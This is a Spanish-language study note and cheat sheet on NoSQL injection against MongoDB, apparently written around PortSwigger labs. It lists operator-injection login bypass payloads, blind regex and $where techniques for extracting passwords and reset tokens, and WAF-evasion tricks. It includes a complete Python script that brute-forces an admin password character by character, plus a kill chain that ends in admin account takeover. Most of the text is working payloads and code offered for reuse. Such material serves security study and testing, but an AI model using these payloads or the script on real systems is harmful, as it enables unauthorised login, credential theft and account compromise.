
---
Tags: #web #form #formularios #noRelacional #mongodb #nosqli 

---
# 📑 Índice

#### Introducción:
- [[#1. Definición y fundamentos]]
    
- [[#2. Superficie de ataque y bases de datos afectadas]]
    - [[#📚 Motores vulnerables]]
    - [[#🎯 Objetivos del atacante]]
    
- [[#3. Metodología profesional de explotación]]
	

#### Técnicas:
- [[#4. Detección de NoSQL Injection]]
    - [[#🔎 Prueba lógica simple]]
	
- [[#5. Operator Injection (Auth Bypass)]]
    - [[#🔓 Técnica principal]]
	
- [[#6. Blind NoSQLi – Extracción de datos]]
    - [[#📏 Paso 1 – Longitud]]
	
- [[#7. Explotación avanzada con $where]]
    - [[#🧠 Enumeración de campos]]
    - [[#🧬 Extracción del token]]
	
- [[#8. Automatización (Scripts y Optimización)]]
	- [[#¿Qué hace?]]
	
- [[#9. Evasión de filtros y WAF]]
    - [[#🛡 9.1 Técnicas de evasión estructural]]
    - [[#🔐 9.2 Encoding / representación alternativa]]
    - [[#🔁 9.3 Sustitución de operadores]]
    - [[#🧠 9.4 Bypass avanzado con `$where`]]
    - [[#🔬 9.5 Bypass por estructura inesperada]]
	

#### Tablas, Resumenes y Recursos:
- [[#10. Cadena ofensiva completa (Kill Chain práctica)]]
    
- [[#11. Tablas técnicas Cheatsheet (payloads, cluster bomb, bypass)]]
    - [[#🔓 AUTH BYPASS PAYLOADS]]
    - [[#📏 LONGITUD]]
    - [[#🔎 EXTRACCIÓN POR REGEX]]
    - [[#🧬 EXTRACCIÓN CON `$where`]]
    - [[#🛡 BYPASS WAF AVANZADOS]]
    - [[#🛡 BYPASS WAF AVANZADOS]]
    - [[#🎯 CLUSTER BOMB TEMPLATE]]
    
- [[#12. Herramientas y referencias]]
    

---

# 1. Fundamentos de NoSQL Injection

> NoSQL Injection es la manipulación de consultas NoSQL mediante la inyección de operadores o estructuras JSON que alteran la lógica de filtrado.

En motores como **MongoDB**, las consultas aceptan objetos:

db.users.find({ username: input })

Si `input` es:

{ "$ne": null }

La consulta deja de buscar igualdad y pasa a buscar “cualquier valor distinto de null”.

---

# 2. Superficie de ataque y contexto técnico

## Motores comunes

- MongoDB
    
- CouchDB
    
- Firebase
    
- ElasticSearch
    
- Redis (configuraciones específicas)
    

MongoDB es el caso más frecuente.

---

## Formatos vulnerables

|Tipo|Ejemplo|
|---|---|
|POST JSON|`Content-Type: application/json`|
|POST urlencoded|`username[$ne]=x`|
|GET|`?user=admin&pass[$regex]=^a`|
|Blind lógico|comparación booleana|

---

# 3. Metodología profesional de explotación

1️⃣ Identificar input controlado  
2️⃣ Probar ruptura lógica (' || true || ')  
3️⃣ Probar operator injection  
4️⃣ Confirmar bypass  
5️⃣ Extraer longitud  
6️⃣ Extraer caracteres  
7️⃣ Enumerar campos ocultos  
8️⃣ Exfiltrar tokens

---

# 4. Detección de NoSQLi

## Prueba booleana simple

Tu ejemplo:

`/filter?category=Gifts' || '1'=='1`

También:

`Gifts' || true || '`

Si aparecen más resultados → la consulta se ha alterado.

---

## Detección mediante operadores

username[$ne]=a

Si cambia el comportamiento → operator injection confirmada.

---

# 5. Operator Injection (Auth Bypass)

## JSON bypass

```json
{  
 "username": { "$ne": null },  
 "password": { "$ne": null }  
}
```

Selecciona cualquier documento válido.

---

## Regex targeting admin

```json
{  
 "username": { "$regex":"^adm" },  
 "password": { "$ne": null }  
}
```

Selecciona cuentas tipo admin.

---

## Variaciones profesionales

|Payload|Explicación breve|
|---|---|
|`{ "$gt": "" }`|Selecciona cualquier string mayor que vacío|
|`{ "$in": ["admin","root"] }`|Fuerza coincidencia si alguno existe|
|`{ "$exists": true }`|Campo existe|
|`{ "$not": {"$eq": null} }`|Alternativa a `$ne:null`|

---

# 6. Blind NoSQLi – Extracción estructurada

## Paso 1 – Longitud

this.password.length > 7

Optimizar con búsqueda binaria.

## Paso 2 – Regex incremental

```textplain
^a  
^ad  
^adm
```

Ejemplo JSON:

```json
"password":{"$regex":"^adm"}
```

---

## Paso 3 – Extracción por índice (alternativa)

"$where":"this.password[0]=='a'"

Más preciso que regex en algunos escenarios.

---

# 7. Explotación avanzada con `$where` (Estructurado y operativo)

> `$where` permite ejecutar **JavaScript sobre cada documento**.  
> Es extremadamente potente cuando está habilitado.

---

## 🧠 7.1 Enumeración estructural del documento

### 🔎 Descubrir número de campos

|Objetivo|Payload|Qué evalúa|Resultado esperado|
|---|---|---|---|
|Contar campos|`"$where":"Object.keys(this).length==6"`|Número total de propiedades|True cuando coincide|
|Mayor que|`"$where":"Object.keys(this).length>5"`|Búsqueda progresiva|Ajustar hasta exacto|
|Menor que|`"$where":"Object.keys(this).length<10"`|Acotar rango|Optimización tipo binary search|

---

## 🔍 7.2 Enumerar nombre de campos (Tu técnica real)

### Payload base que usaste:

```json
{  
 "username":"carlos",  
 "password":{"$ne":null},  
 "$where":"Object.keys(this)[4].match('^.{}.*')"  
}
```

### Método profesional estructurado

|Paso|Payload tipo|Explicación|
|---|---|---|
|Descubrir índice válido|`Object.keys(this)[0]`|Probar índices 0–20|
|Extraer primer carácter|`match('^u')`|Si devuelve true → empieza por "u"|
|Construcción progresiva|`match('^us')`|Enumeración incremental|
|Completar campo|`username`, `email`, `newPwdTkn`|Campo reconstruido|

---

## 🧬 7.3 Extracción de valor de campo desconocido (Tu caso real)

Payload tuyo:

`"$where":"this.newPwdTkn.match('^.{}.*')"`

### Variante estructurada para cluster bomb

`"$where":"this.newPwdTkn.match('^§prefix§')"`

|Técnica|Payload ejemplo|Explicación|
|---|---|---|
|Prefijo simple|`^a`|Primer carácter|
|Segundo carácter|`^ab`|Confirmación progresiva|
|Posición específica|`^.{3}a`|Carácter en índice 3|
|Índice directo|`this.newPwdTkn[0]=='a'`|Alternativa sin regex|

---

## 🔬 Comparativa Regex vs Índice directo

|Método|Ventaja|Desventaja|
|---|---|---|
|`match("^abc")`|Flexible|Más ruido|
|`this.field[i]=='a'`|Preciso|Requiere índice|
|`length`|Rápido|Solo estructura|

---

# 8. Automatización ofensiva (Script completo profesional)

Ahora sí, versión completa, estructurada en fases, usando tu lógica original pero mejorada.

---

## 🧠 Fases del script

1. Detectar longitud
    
2. Extraer password carácter a carácter
    
3. Optimizar charset
    
4. Manejar errores
    

---

## 🧪 Script completo mejorado

```python
#!/usr/bin/python3  
  
import requests  
import string  
import sys  
import signal  
import time  
  
# CTRL+C handler  
def def_handler(sig, frame):  
    print("\n[!] Saliendo...\n")  
    sys.exit(1)  
  
signal.signal(signal.SIGINT, def_handler)  
  
# CONFIGURACIÓN  
url = "http://localhost:4000/user/login"  
headers = {"Content-Type": "application/json"}  
  
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits  
  
# -------------------------  
# FASE 1: DETECTAR LONGITUD  
# -------------------------  
  
def get_length():  
  
    print("[*] Detectando longitud...")  
  
    for length in range(1, 40):  
  
        payload = {  
            "username": "admin",  
            "password": {  
                "$regex": "^.{%d}$" % length  
            }  
        }  
  
        r = requests.post(url, headers=headers, json=payload)  
  
        if "Logged in as user" in r.text:  
            print(f"[+] Longitud encontrada: {length}")  
            return length  
  
    return None  
  
  
# -------------------------  
# FASE 2: EXTRAER PASSWORD  
# -------------------------  
  
def extract_password(length):  
  
    password = ""  
    print("[*] Extrayendo contraseña...")  
  
    for position in range(length):  
  
        for char in charset:  
  
            attempt = password + char  
  
            payload = {  
                "username": "admin",  
                "password": {  
                    "$regex": "^%s" % attempt  
                }  
            }  
  
            r = requests.post(url, headers=headers, json=payload)  
  
            if "Logged in as user" in r.text:  
                password += char  
                print(f"[+] Parcial: {password}")  
                break  
  
    return password  
  
  
# -------------------------  
# MAIN  
# -------------------------  
  
def main():  
  
    length = get_length()  
  
    if not length:  
        print("[!] No se pudo determinar longitud.")  
        return  
  
    password = extract_password(length)  
  
    print(f"\n[✔] Password final: {password}\n")  
  
  
if __name__ == "__main__":  
    main()
```

---

## 🔧 Mejoras adicionales posibles

|Mejora|Cómo implementarla|
|---|---|
|Binary search longitud|Usar > y <|
|Multithreading|concurrent.futures|
|Time-based|Medir r.elapsed|
|Detección bloqueo|Analizar status 429|

---

# 9. Evasión de filtros y WAF (Tabla ampliada profesional)

---

## 🛡 9.1 Técnicas de evasión estructural

|Técnica|Payload|Explicación|
|---|---|---|
|Duplicar clave|`{"id":"1","id":"2"}`|Mongo usa la última|
|Array wrapping|`"password":[{"$ne":null}]`|Algunos parsers lo aceptan|
|Tipo diferente|`"password":{"$ne":1}`|Evita filtros string|
|Null byte|`"admin\0"`|Algunos filtros lo cortan|
|Boolean injection|`"password":true`|Alterar tipo|

---

## 🔐 9.2 Encoding / representación alternativa

|Técnica|Ejemplo|Uso|
|---|---|---|
|Double encoding|`%2524ne`|Evadir detección `$`|
|Unicode escape|`\u0024ne`|`$` en unicode|
|URL encode|`%24ne`|Forma básica|
|JSON spacing|`{ "$ne" : null }`|Bypass regex pobre|
|Case variation|`$Ne`|Algunos WAF case-sensitive|

---

## 🔁 9.3 Sustitución de operadores

Si bloquean `$regex`:

|Alternativa|Ejemplo|Uso|
|---|---|---|
|`$gt`|`{"$gt":""}`|Cualquier string|
|`$lt`|`{"$lt":"zzz"}`|Rango|
|`$in`|`{"$in":["admin"]}`|Lista|
|`$exists`|`{"$exists":true}`|Verificar campo|
|`$not`|`{"$not":{"$eq":null}}`|Lógica inversa|

---

## 🧠 9.4 Bypass avanzado con `$where`

|Payload|Explicación|
|---|---|
|`"$where":"1==1"`|Siempre verdadero|
|`"$where":"this.a==1||
|`"$where":"this.password.length>0"`|Comprobación indirecta|
|Comentario JS|`//`|

---

## 🔬 9.5 Bypass por estructura inesperada

|Técnica|Ejemplo|
|---|---|
|Objeto dentro de array|`[{"$ne":null}]`|
|JSON nested|`{"a":{"b":{"$ne":null}}}`|
|Campo repetido|`{"user":"a","user":{"$ne":null}}`|

---

# 10. Kill Chain ofensiva completa

1. `' || true || '`
    
2. Confirmación operator injection
    
3. Bypass login
    
4. Enumeración usuario admin
    
5. Longitud password
    
6. Extracción password
    
7. Descubrir reset endpoint
    
8. Enumerar campos con `$where`
    
9. Extraer `newPwdTkn`
    
10. Reset admin
    

Impacto: compromiso total.

---

# 11. Tablas técnicas Cheatsheet (payloads, cluster bomb, bypass)

|Técnica|Impacto|Ruido|Complejidad|
|---|---|---|---|
|`$ne` bypass|Alto|Bajo|Baja|
|`$regex` blind|Alto|Medio|Media|
|`$where` enum|Crítico|Bajo|Alta|
|Token extraction|Crítico|Bajo|Alta|

---

## 🔓 AUTH BYPASS PAYLOADS

| Payload                               | Explicación            |
| ------------------------------------- | ---------------------- |
| `{"$ne":null}`                        | Campo distinto de null |
| `{"$gt":""}`                          | String mayor que vacío |
| `{"$regex":".*"}`                     | Cualquier valor        |
| `{"$exists":true}`                    | Campo existe           |
| `{"$not":{"$eq":null}}`               | Alternativa lógica     |
| `username[$ne]=a`                     | URL encoded            |
| `username[$regex]=^adm`               | Target admin           |
| `password[$in][]=a&password[$in][]=b` | Multi match            |

---

## 📏 LONGITUD

|Payload|Explicación|
|---|---|
|`this.password.length>5`|Mayor que|
|`this.password.length==8`|Exacto|
|`this.password.length<10`|Menor que|

---

## 🔎 EXTRACCIÓN POR REGEX

|Payload|Uso|
|---|---|
|`^a`|Primer carácter|
|`^adm`|Prefijo|
|`a$`|Último carácter|
|`^.{5}a`|Carácter en posición 6|
|`^.{0,3}a`|Rango|

---

## 🧬 EXTRACCIÓN CON `$where`

|Payload|Explicación|
|---|---|
|`this.password[0]=='a'`|Índice directo|
|`this.password.match('^adm')`|Prefijo|
|`Object.keys(this)[0]`|Campo|
|`Object.keys(this).length`|Nº campos|

---

## 🛡 BYPASS WAF AVANZADOS

| Técnica         | Ejemplo                | Explicación breve          |
| --------------- | ---------------------- | -------------------------- |
| Double encode   | `%2524ne`              | Evadir filtros `$`         |
| Unicode encode  | `\u0024ne`             | Representación alternativa |
| Duplicar clave  | `{"a":1,"a":2}`        | Última prevalece           |
| Tipo incorrecto | `{"$ne":1}`            | Cambia comparación         |
| Array wrapping  | `[{"$ne":null}]`       | Bypass parser              |
| Espacios JSON   | `{ "$ne" : null }`     | Algunos WAF fallan         |
| Comentarios JS  | `$where:"this.a==1//"` | Si `$where` activo         |

---

## 🎯 CLUSTER BOMB TEMPLATE

```json
{  
 "username":"carlos",  
 "password":{"$ne":null},  
 "$where":"Object.keys(this)[§pos§].match('^§char§')"  
}
```

|Variable|Valores|
|---|---|
|§pos§|0–20|
|§char§|a-zA-Z0-9_|

---

# 12. Herramientas y referencias

- PortSwigger — Laboratorios NoSQLi
    
- PayloadsAllTheThings — Colección masiva de payloads
    
- NoSQLMap — Automatización
    
- HackTricks — Técnicas adicionales